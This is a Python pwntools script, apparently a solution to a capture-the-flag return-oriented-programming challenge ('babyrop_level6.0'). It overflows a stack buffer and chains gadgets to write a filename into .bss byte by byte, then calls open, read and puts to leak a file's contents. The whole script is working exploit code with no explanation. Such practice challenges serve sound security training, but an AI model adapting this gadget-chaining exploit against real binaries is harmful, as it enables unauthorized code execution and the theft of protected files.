from pwn import *

p = process("/challenge/babyrop_level6.0")

#gdb.attach(p,'''break challenge
#break *0x401b42
#break *0x4011d0
#break *0x4011d0
#''')

open_plt = 0x4011d0
read_plt = 0x401160
call_puts = 0x401130
gadget1 = 0x4012bb # add [rcx], al ; pop rbp ; ret
gadget2 = 0x401a1c # pop rcx ; ret
gadget3 = 0x401a14 # pop rdi ; ret
gadget4 = 0x401a04 # pop rsi ; ret
gadget5 = 0x401a0c # pop rdx ; ret

bss = 0x404100

null_string = 0x402270

payload = b"A"*40
payload += p64(gadget3)+p64(null_string-0x2f+1)
payload += p64(call_puts)
payload += p64(gadget2)+p64(bss)
payload += p64(gadget1)+p64(0x10)

payload += p64(gadget3)+p64(null_string-0x2f)
payload += p64(call_puts)
payload += p64(gadget2)+p64(bss+1)
payload += p64(gadget1)+p64(0x10)
payload += p64(gadget3)+p64(null_string-0x36+1)
payload += p64(call_puts)
payload += p64(gadget2)+p64(bss+1)
payload += p64(gadget1)+p64(0x10) 

payload += p64(gadget3)+p64(null_string-0x2f+1)
payload += p64(call_puts)
payload += p64(gadget2)+p64(bss+2)
payload += p64(gadget1)+p64(0x10)
payload += p64(gadget3)+p64(null_string-0x3d+1)
payload += p64(call_puts)
payload += p64(gadget2)+p64(bss+2)
payload += p64(gadget1)+p64(0x10) 

payload += p64(gadget3)+p64(null_string-0x2f+1)
payload += p64(call_puts)
payload += p64(gadget2)+p64(bss+3)
payload += p64(gadget1)+p64(0x10)
payload += p64(gadget3)+p64(null_string-0x32+1)
payload += p64(call_puts)
payload += p64(gadget2)+p64(bss+3)
payload += p64(gadget1)+p64(0x10) 

payload += p64(gadget3)+p64(null_string-0x2f)
payload += p64(call_puts)
payload += p64(gadget2)+p64(bss+4)
payload += p64(gadget1)+p64(0x10)
payload += p64(gadget3)+p64(null_string-0x37+1)
payload += p64(call_puts)
payload += p64(gadget2)+p64(bss+4)
payload += p64(gadget1)+p64(0x10) 

payload += p64(gadget3)+p64(bss)
payload += p64(gadget4)+p64(0)
payload += p64(gadget5)+p64(0)
payload += p64(open_plt)

payload += p64(gadget3)+p64(3)
payload += p64(gadget4)+p64(bss+8)
payload += p64(gadget5)+p64(500)
payload += p64(read_plt)

payload += p64(gadget3)+p64(bss+8)
payload += p64(call_puts)

p.send(payload)

p.interactive()
